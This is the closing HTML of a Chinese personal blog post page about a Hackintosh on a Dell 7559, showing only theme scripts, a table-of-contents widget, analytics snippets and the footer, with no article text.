                            <a href="/categories/Linux/黑苹果/" class="post-category">
                                    黑苹果
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/黑苹果/">
                        <span class="chip bg-color">黑苹果</span>
                    </a>
                    
                    <a href="/tags/hackintosh/">
                        <span class="chip bg-color">hackintosh</span>
                    </a>
                    
                    <a href="/tags/dell-7559/">
                        <span class="chip bg-color">dell-7559</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: 江南小虫虫的博客<br />'
            + '文章作者: 冯文华<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>

    
<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>

    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3, h4, h5, h6'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4, h5, h6').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>


<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
    MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
    });
</script>


    <footer class="page-footer bg-color">
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2018</span>
            <a href="https://www.fengwenhua.top" target="_blank">冯文华</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">146.4k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/fengwenhua" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:807296772@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=807296772" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 807296772" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140817753-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-140817753-1');
</script>


    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    

    

    
    
    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
